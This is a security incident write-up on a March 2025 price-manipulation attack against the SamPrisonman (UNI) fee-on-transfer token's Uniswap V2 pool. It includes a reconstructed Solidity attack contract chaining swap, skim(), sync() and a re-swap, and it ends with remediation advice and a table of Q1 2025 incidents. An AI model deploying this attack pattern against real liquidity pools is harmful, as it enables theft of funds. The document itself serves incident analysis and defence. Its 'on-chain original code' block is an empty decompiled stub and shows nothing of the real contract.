# UNI (SamPrisonman) Token — fee-on-transfer + skim/sync Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-20 |
| **Protocol** | UNI / SamPrisonman Token |
| **Chain** | Ethereum |
| **Loss** | ~$14,000 |
| **Attacker** | [0x97d8170e...](https://etherscan.io/address/0x97d8170e04771826a31c4c9b81e9f9191a1c8613) |
| **Attack Tx** | [Unconfirmed (BlockSec)](https://etherscan.io) |
| **Vulnerable Contract** | [0x76ea342b...](https://etherscan.io/address/0x76ea342bc038d665e8a116392c82552d2605eda1) |
| **Root Cause** | Same pattern as SBR token — fee-on-transfer mechanism combined with Uniswap V2 `skim()`/`sync()` functions induces reserve imbalance, enabling price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/UNI_exp.sol) |

---

## 1. Vulnerability Overview

The SamPrisonman (UNI) token shares the same fee-on-transfer + skim/sync vulnerable pattern as the SBR token. The attacker purchased a small amount of SamPrisonman tokens with ETH via the Uniswap V2 Router, then sequentially called `skim()` and `sync()` to manipulate the pool's reserves, and re-swapped the held tokens back to ETH at a favorable price, stealing approximately $14,000. This is the same vulnerability pattern as the SBR Token attack that occurred the same week, suggesting code reuse or attack automation.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Same vulnerable structure as SBR: fee-on-transfer + Uniswap V2 reserve manipulation

// SamPrisonman token transfer fee
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 fee = amount * transferFeeRate / 100;
    uint256 netAmount = amount - fee;

    // Fee is burned or sent to an internal address
    super._transfer(from, DEAD_ADDRESS, fee);
    // Recipient receives only netAmount
    super._transfer(from, to, netAmount);

    // Problem: actual amount received by pool < transferred amount
    // Uniswap V2 reserves do not track this discrepancy
    // → surplus can be extracted via skim()
}

// Uniswap V2 pair.skim(to):
//   actual balance - reserve = surplus → transferred to `to` address

// Uniswap V2 pair.sync():
//   reserve = updated to current actual balance

// ✅ Mitigation is identical to SBR Token:
// 1) Remove transfer fee
// 2) Restrict skim()
// 3) Rate-limit sync() changes
// 4) Use AMMs designed to be aware of fee-on-transfer tokens
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: UNI_decompiled.sol
contract UNI {
    function skim(address a) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Swap ETH → SamPrisonman via Uniswap V2 Router
  │         └─ swapExactETHForTokensSupportingFeeOnTransferTokens
  │            fee-on-transfer: receives tokens after fee deduction
  │
  ├─→ [2] Call pair.skim(address(this))
  │         └─ Extract accumulated fee balance in pool (actual balance - reserve)
  │
  ├─→ [3] Transfer 1 unit of SamPrisonman to the pair
  │
  ├─→ [4] Call pair.sync()
  │         └─ Update reserve to current lower balance
  │            → SamPrisonman price in ETH terms drops sharply in the pool
  │
  ├─→ [5] Re-swap held SamPrisonman → ETH
  │         └─ Sell at favorable price due to distorted reserves
  │
  └─→ [6] ~$14,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — summary and reconstruction based on SBR pattern

contract UNISamPrisonmanAttacker {
    address constant SAM_TOKEN = 0x76ea342bc038d665e8a116392c82552d2605eda1;
    address constant SAM_PAIR = /* Uniswap V2 SamPrisonman/WETH pair */;
    address constant UNISWAP_V2_ROUTER = /* Uniswap V2 Router */;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function attack() external payable {
        // [1] Buy SamPrisonman with ETH (triggers fee-on-transfer)
        address[] memory path = new address[](2);
        path[0] = WETH; path[1] = SAM_TOKEN;
        IUniswapV2Router(UNISWAP_V2_ROUTER)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: msg.value
            }(0, path, address(this), block.timestamp);

        // [2] Extract surplus SamPrisonman from pool via skim()
        // (accumulated fee deduction = actual balance - reserve)
        IUniswapV2Pair(SAM_PAIR).skim(address(this));

        // [3] Transfer 1 unit of SamPrisonman to the pool
        IERC20(SAM_TOKEN).transfer(SAM_PAIR, 1);

        // [4] Sync reserve to current lower value via sync()
        // → Distorts SamPrisonman price in the pool
        IUniswapV2Pair(SAM_PAIR).sync();

        // [5] Re-swap all held SamPrisonman → ETH
        uint256 samBalance = IERC20(SAM_TOKEN).balanceOf(address(this));
        IERC20(SAM_TOKEN).approve(UNISWAP_V2_ROUTER, samBalance);
        path[0] = SAM_TOKEN; path[1] = WETH;
        IUniswapV2Router(UNISWAP_V2_ROUTER)
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                samBalance, 0, path, msg.sender, block.timestamp
            );
        // Result: ~$14,000 gained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | fee-on-transfer + skim/sync combined price manipulation (same pattern as SBR) |
| **CWE** | CWE-682: Incorrect Calculation (reserve mismatch) |
| **Attack Vector** | External (public AMM function sequence manipulation) |
| **DApp Category** | Token / AMM |
| **Impact** | ~$14,000 stolen |

## 6. Remediation Recommendations

1. **Remove transfer fee**: Tokens integrated with AMMs should not use fee-on-transfer mechanisms
2. **Restrict skim() access**: When forking Uniswap V2, restrict the `skim()` function to `onlyOwner` or remove it entirely
3. **Rate-limit sync() changes**: Block sync() when reserves change beyond a threshold within a single block
4. **Token integration audit**: Comprehensively test interactions between fee-on-transfer and pool functions before listing a token on an AMM

## 7. Lessons Learned

- The same vulnerability that appeared in the SBR attack (2025-03-15) recurred in a different token (SamPrisonman) just 5 days later. Consecutive attacks using the same pattern suggest the attacker used an automated script.
- fee-on-transfer + skim/sync is a vulnerability pattern repeatedly exploited in the DeFi ecosystem. This combination should be regarded as an "anti-pattern in token design."
- Once a vulnerable code pattern is disclosed, attackers rapidly scan for other contracts with the same pattern, making immediate and broad alert sharing for similar vulnerabilities critically important.

---

## Q1 2025 Incident Summary Comparison Table

| Date | Protocol | Chain | Loss | Vulnerability Type |
|------|----------|------|------|------------|
| 2025-01-06 | LAURA Token | ETH | ~$41K | Flash loan liquidity manipulation |
| 2025-01-07 | 98Token | BSC | ~$28K | Missing access control |
| 2025-01-08 | SorraStaking | ETH | ~$8 ETH | Reward calculation error |
| 2025-01-10 | Mosca (1st) | BSC | ~$19K | Flash loan state manipulation |
| 2025-01-10 | IPC Token | BSC | ~$590K | Timelock bypass |
| 2025-01-10 | HORS Token | BSC | ~14.8 BNB | Missing input validation |
| 2025-01-11 | LPMine | BSC | ~$24K | Reward claim not updated |
| 2025-01-13 | JPulsepot | BSC | ~$21.5K | Price manipulation + access control |
| 2025-01-14 | RoulettePotV2 | BSC | ~$28K | Missing access control |
| 2025-01-15 | Unilend | ETH | ~60 stETH | Health factor miscalculation |
| 2025-01-17 | Mosca (2nd) | BSC | ~$37.6K | Same vulnerability unpatched |
| 2025-01-20 | IdolsNFT | ETH | ~97 stETH | Self-transfer reward duplication |
| 2025-01-22 | Paribus | ARB | ~$86K | NFT collateral overvaluation |
| 2025-01-25 | AST Token | BSC | ~$65K | Double withdrawal bug |
| 2025-01-27 | ODOS | Base | ~$50K | ERC-6492 signature bypass |
| 2025-02-03 | Peapods Finance | ETH | ~$3.5K | Slippage parameter manipulation |
| 2025-02-10 | FourMeme | BSC | ~$186K | Pool creation front-running |
| 2025-02-12 | Unverified d4f1 | BSC | ~$15.2K | Uninitialized proxy |
| 2025-02-21 | Bybit | ETH | ~$1.5B | Safe delegatecall manipulation |
| 2025-02-22 | StepHeroNFTs | BSC | ~137.9 BNB | Reentrancy attack |
| 2025-02-24 | Unverified 35bc | ETH | ~$6.7K | Missing access control |
| 2025-02-26 | Hegic Options | ETH | ~$104M | Missing state update |
| 2025-02-28 | Venus zkSync | zkSync | ~86.7 WETH | ERC4626 donation attack |
| 2025-03-05 | Pump Token | BSC | ~11.29 BNB | Liquidity manipulation |
| 2025-03-10 | 1inch Fusion V1 | ETH | ~$4.5M | Yul overflow |
| 2025-03-15 | SBR Token | ETH | ~8.495 ETH | fee-on-transfer+skim |
| 2025-03-20 | UNI (SamPrisonman) | ETH | ~$14K | fee-on-transfer+skim |